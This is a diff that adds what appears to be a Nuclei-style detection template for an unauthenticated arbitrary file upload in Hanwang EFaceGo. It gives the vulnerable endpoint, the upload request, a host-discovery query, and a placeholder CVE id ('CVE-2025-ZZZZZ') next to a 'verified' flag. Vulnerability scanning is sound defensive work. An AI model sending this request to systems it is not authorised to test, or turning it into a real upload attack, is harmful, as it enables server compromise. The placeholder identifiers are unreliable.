@@ -1,0 +1,62 @@
+http:
+    - body: |
+        {
+          "id":1,
+          "mapName":"{{randstr}}",
+          "fileType":"txt",
+          "updatedPhoto":"{{base64(content)}}"
+        }
+      extractors:
+        - group: 1
+          part: body
+          regex:
+            - '"message":"([^"]+)"'
+          type: regex
+      headers:
+        Content-Type: application/json
+      matchers:
+        - status:
+            - 200
+          type: status
+        - condition: or
+          part: body
+          type: word
+          words:
+            - success
+            - file uploaded
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken={{randstr}}'
+id: CVE-2025-ZZZZZ
+info:
+    author: ProjectDiscoveryAI
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+        cvss-score: 8.8
+        cwe-id: CWE-434
+    description: |
+        Hanwang EFaceGo contains an arbitrary file upload vulnerability in the /manage/visitorMapConfig/updateVisitorMapConfig.do endpoint
+        that allows unauthenticated attackers to upload malicious files and potentially execute server-side code.
+    metadata:
+        fofa-query: app="Hanwang-EFaceGo"
+        max-request: 1
+        product: efacego
+        vendor: hanwang
+        verified: true
+    name: Hanwang EFaceGo Arbitrary File Upload
+    reference:
+        - https://www.hanwang.com.cn/security
+        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-ZZZZZ
+        - https://cwe.mitre.org/data/definitions/434.html
+    severity: high
+    tags:
+        - hanwang
+        - efacego
+        - file-upload
+        - unrestricted
+        - authenticate
+variables:
+    boundary: '{{randstr}}'
+    content: '{{randstr}}'
+    filename: '{{randstr}}.txt'
